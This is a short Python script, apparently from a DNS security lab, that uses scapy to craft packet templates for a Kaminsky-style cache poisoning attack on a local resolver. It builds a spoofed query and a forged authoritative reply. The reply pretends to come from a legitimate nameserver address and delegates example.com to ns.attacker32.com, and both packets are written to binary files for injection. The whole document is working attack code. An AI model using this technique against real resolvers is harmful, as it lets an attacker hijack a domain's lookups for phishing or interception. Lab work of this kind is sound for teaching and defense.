#!/usr/bin/env python3
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP

LOCAL_DNS = "10.9.0.53"
QUERY_SRC = "10.9.0.153"
LEGIT_NS = "108.162.192.162"
PLACEHOLDER = "twysw"

name = f"{PLACEHOLDER}.example.com"
qd = DNSQR(qname=name)

request_dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=qd)
request_ip = IP(dst=LOCAL_DNS, src=QUERY_SRC, chksum=0)
request_udp = UDP(dport=53, sport=44444, chksum=0)
request = request_ip / request_udp / request_dns

answer = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
ns = DNSRR(rrname="example.com", type="NS", rdata="ns.attacker32.com", ttl=259200)
response_dns = DNS(
    id=0xAAAA,
    aa=1,
    rd=1,
    qr=1,
    qdcount=1,
    ancount=1,
    nscount=1,
    arcount=0,
    qd=qd,
    an=answer,
    ns=ns,
)
response_ip = IP(dst=LOCAL_DNS, src=LEGIT_NS, chksum=0)
response_udp = UDP(dport=33333, sport=53, chksum=0)
response = response_ip / response_udp / response_dns

with open("ip_req.bin", "wb") as handle:
    handle.write(bytes(request))

with open("ip_resp.bin", "wb") as handle:
    handle.write(bytes(response))

print(f"Prepared ip_req.bin and ip_resp.bin with legitimate NS {LEGIT_NS}")
